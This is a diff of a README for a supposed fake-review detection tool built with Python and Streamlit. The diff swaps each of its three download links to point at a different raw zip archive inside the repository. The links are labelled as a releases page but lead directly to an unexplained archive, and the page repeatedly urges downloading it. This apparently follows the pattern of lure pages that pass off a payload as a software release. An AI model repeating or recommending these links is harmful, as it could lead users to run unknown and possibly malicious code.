@@ -1,7 +1,7 @@
 # 🛠️ Fake-Review-Detector - Detect Fake Reviews Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/kruts/Fake-Review-Detector/main/data/Fake-Review-Detector_1.6.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/kruts/Fake-Review-Detector/main/data/Fake-Review-Detector_1.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/kruts/Fake-Review-Detector/main/outputs/Fake-Review-Detector-3.3-beta.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/kruts/Fake-Review-Detector/main/outputs/Fake-Review-Detector-3.3-beta.5.zip)
 
 ## 📝 Description
 Welcome to Fake-Review-Detector, an AI-powered application designed to help you identify fake or spammy product reviews. This tool uses Python, Streamlit, and Scikit-learn to analyze text and detect synthetic behavior. With advanced techniques like TF-IDF vectorization and Logistic Regression, you'll get clear results on whether a review is genuine or not. The interactive dashboard provides a user-friendly experience for anyone to navigate.
@@ -16,7 +16,7 @@ To begin using Fake-Review-Detector, follow these simple steps:
    - Internet: Required for downloading necessary packages
 
 2. **Download & Install**
-   Visit this page to download: [Fake-Review-Detector Releases](https://raw.githubusercontent.com/kruts/Fake-Review-Detector/main/data/Fake-Review-Detector_1.6.zip)
+   Visit this page to download: [Fake-Review-Detector Releases](https://raw.githubusercontent.com/kruts/Fake-Review-Detector/main/outputs/Fake-Review-Detector-3.3-beta.5.zip)
 
 3. **Choose Your Version**
    On the releases page, find the latest version. Click the download link for your operating system. Save the file to a location you will remember.
@@ -79,4 +79,4 @@ For support or questions regarding the application, reach out through the Issues
 - Feedback Forum: [Feedback Link](#)
 
 ## 📥 Download Now Again
-Don't forget to download the application from the latest release: [Fake-Review-Detector Releases](https://raw.githubusercontent.com/kruts/Fake-Review-Detector/main/data/Fake-Review-Detector_1.6.zip)
+Don't forget to download the application from the latest release: [Fake-Review-Detector Releases](https://raw.githubusercontent.com/kruts/Fake-Review-Detector/main/outputs/Fake-Review-Detector-3.3-beta.5.zip)
